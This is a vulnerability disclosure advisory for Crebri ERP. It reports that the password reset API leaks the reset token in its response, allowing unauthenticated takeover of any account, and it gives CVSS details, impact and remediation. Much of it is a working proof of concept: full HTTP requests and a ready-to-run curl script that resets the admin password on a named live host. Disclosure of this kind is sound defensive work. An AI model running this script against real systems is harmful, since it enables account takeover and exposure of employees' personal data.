# Unauthenticated Account Takeover via Password Reset Token Disclosure in Crebri ERP

## Overview

A critical vulnerability was discovered in Crebri ERP developed by Crebri Technologies Pvt. Ltd. The password reset API endpoint returns the reset token directly in the HTTP response body, allowing any unauthenticated attacker to take over any user account without requiring access to the victim email.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Vendor | Crebri Technologies Pvt. Ltd. |
| Product | Crebri ERP |
| Android App | com.app.crebri_erp_app |
| Vulnerability Type | CWE-640 Weak Password Recovery Mechanism |
| CVSS Score | 9.8 Critical |
| CVSS Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Authentication Required | None |

## Description

Crebri ERP is affected by CWE-640. The API endpoint /erp_api/reset_password_api/ returns the password reset token directly in the HTTP response body to any unauthenticated requester who provides a valid username, without sending the token to the user registered email address. An unauthenticated attacker can use this token at /erp_api/password_reset_confirm_api/ to reset any user password and gain full account access including administrator accounts. No authentication or user interaction is required.

## Proof of Concept

### Step 1 Request Reset Token

Request:
```
POST /erp_api/reset_password_api/ HTTP/2
Host: erp.sendan.com.sa:8080
Content-Type: application/json

{"username": "admin"}
```

Response:
```
HTTP/2 200 OK
Content-Type: application/json

{
    "token_no": "76a-1b03013c05debf4cf6b2",
    "user_uid": 4488
}
```

### Step 2 Reset Password Using Token

Request:
```
POST /erp_api/password_reset_confirm_api/ HTTP/2
Host: erp.sendan.com.sa:8080
Content-Type: application/json

{
    "token_no": "76a-1b03013c05debf4cf6b2",
    "user_uid": "4488",
    "new_password": "Attacker@123"
}
```

Response:
```
HTTP/2 200 OK
Content-Type: application/json

{
    "error": false,
    "error_code": 200,
    "error_description": "Password has been reset.",
    "redirect_url": "https://erp.sendan.com.sa:8080/user/login/"
}
```

### Step 3 Login as Victim

Request:
```
POST /erp_api/login_user/ HTTP/2
Host: erp.sendan.com.sa:8080
Content-Type: application/json

{"username": "admin", "password": "Attacker@123"}
```

Response:
```
HTTP/2 200 OK

{
    "error": false,
    "error_code": 200,
    "error_description": "Login successful."
}
```

## cURL PoC

```bash
TARGET="https://erp.sendan.com.sa:8080"
USER="${1:-admin}"
NEWPASS="Attacker@123"

RESP=$(curl -sk -X POST "$TARGET/erp_api/reset_password_api/" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$USER\"}")

TOKEN=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['token_no'])")
UID=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['user_uid'])")

echo "[+] Token: $TOKEN | UID: $UID"

curl -sk -X POST "$TARGET/erp_api/password_reset_confirm_api/" \
  -H "Content-Type: application/json" \
  -d "{\"token_no\":\"$TOKEN\",\"user_uid\":\"$UID\",\"new_password\":\"$NEWPASS\"}"

echo "[+] Account $USER taken over. Password: $NEWPASS"
```

## Impact

- Full account takeover of any user without authentication
- Administrator access obtained leading to Django Admin panel exposure
- Database access to 4000+ employee records including PII
- Affects all customers using Crebri ERP platform
- Available on Google Play with 1000+ downloads

## Affected Endpoints

| Endpoint | Method | Auth Required | Issue |
|----------|--------|---------------|-------|
| /erp_api/reset_password_api/ | POST | None | Returns token in response |
| /erp_api/password_reset_confirm_api/ | POST | None | Resets password with token |

## Remediation

1. Never return the reset token in the API response
2. Send the token only to the user registered email
3. Invalidate token after single use
4. Add rate limiting on the reset endpoint
5. Set token expiry to 15 minutes maximum

## References

- Google Play: https://play.google.com/store/apps/details?id=com.app.crebri_erp_app
- CWE-640: https://cwe.mitre.org/data/definitions/640.html

## Discovered By

Abdullah Alannaz
